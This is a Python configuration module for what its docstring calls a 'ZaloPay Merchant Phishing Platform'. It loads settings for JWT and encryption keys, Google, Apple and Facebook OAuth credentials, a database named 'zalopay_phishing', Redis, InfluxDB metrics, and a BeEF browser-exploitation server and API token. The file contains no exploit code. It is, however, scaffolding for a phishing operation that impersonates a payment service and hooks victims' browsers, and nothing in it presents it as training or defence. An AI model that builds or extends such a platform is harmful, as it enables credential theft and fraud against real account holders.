"""
Configuration Management for ZaloPay Merchant Phishing Platform
Loads environment variables and provides application settings
"""

import os
from typing import List
from pydantic import BaseSettings, Field


class Settings(BaseSettings):
    """Application settings loaded from environment variables"""
    
    # Application Configuration
    DEBUG: bool = Field(default=False, env="DEBUG")
    LOG_LEVEL: str = Field(default="INFO", env="LOG_LEVEL")
    WORKERS: int = Field(default=4, env="WORKERS")
    
    # Domain Configuration
    DOMAIN: str = Field(default="localhost", env="DOMAIN")
    
    # JWT Configuration
    JWT_SECRET_KEY: str = Field(default="change-this-secret-key", env="JWT_SECRET_KEY")
    JWT_EXPIRATION_HOURS: int = Field(default=24, env="JWT_EXPIRATION_HOURS")
    
    # Encryption Configuration
    ENCRYPTION_KEY: str = Field(default="change-this-encryption-key", env="ENCRYPTION_KEY")
    
    # CORS Configuration
    CORS_ORIGINS: List[str] = Field(
        default=["http://localhost:3000", "http://localhost:8000"],
        env="CORS_ORIGINS"
    )
    CORS_METHODS: List[str] = Field(default=["*"], env="CORS_METHODS")
    CORS_HEADERS: List[str] = Field(default=["*"], env="CORS_HEADERS")
    
    # Rate Limiting Configuration
    RATE_LIMIT_REQUESTS: int = Field(default=100, env="RATE_LIMIT_REQUESTS")
    RATE_LIMIT_WINDOW: int = Field(default=60, env="RATE_LIMIT_WINDOW")
    
    # OAuth Configuration
    GOOGLE_CLIENT_ID: str = Field(default="", env="GOOGLE_CLIENT_ID")
    GOOGLE_CLIENT_SECRET: str = Field(default="", env="GOOGLE_CLIENT_SECRET")
    GOOGLE_REDIRECT_URI: str = Field(default="", env="GOOGLE_REDIRECT_URI")
    
    APPLE_CLIENT_ID: str = Field(default="", env="APPLE_CLIENT_ID")
    APPLE_CLIENT_SECRET: str = Field(default="", env="APPLE_CLIENT_SECRET")
    APPLE_REDIRECT_URI: str = Field(default="", env="APPLE_REDIRECT_URI")
    
    FACEBOOK_CLIENT_ID: str = Field(default="", env="FACEBOOK_CLIENT_ID")
    FACEBOOK_CLIENT_SECRET: str = Field(default="", env="FACEBOOK_CLIENT_SECRET")
    FACEBOOK_REDIRECT_URI: str = Field(default="", env="FACEBOOK_REDIRECT_URI")
    
    # Database Configuration
    MONGODB_URI: str = Field(default="mongodb://localhost:27017", env="MONGODB_URI")
    MONGODB_DATABASE: str = Field(default="zalopay_phishing", env="MONGODB_DATABASE")
    
    # Redis Configuration
    REDIS_HOST: str = Field(default="localhost", env="REDIS_HOST")
    REDIS_PORT: int = Field(default=6379, env="REDIS_PORT")
    REDIS_PASSWORD: str = Field(default="", env="REDIS_PASSWORD")
    
    # InfluxDB Configuration
    INFLUXDB_URL: str = Field(default="http://localhost:8086", env="INFLUXDB_URL")
    INFLUXDB_TOKEN: str = Field(default="", env="INFLUXDB_TOKEN")
    INFLUXDB_ORG: str = Field(default="zalopay", env="INFLUXDB_ORG")
    INFLUXDB_BUCKET: str = Field(default="metrics", env="INFLUXDB_BUCKET")
    
    # BeEF Configuration
    BEEF_URL: str = Field(default="http://localhost:3000", env="BEEF_URL")
    BEEF_API_TOKEN: str = Field(default="", env="BEEF_API_TOKEN")
    
    class Config:
        env_file = ".env"
        case_sensitive = True


# Create global settings instance
settings = Settings()
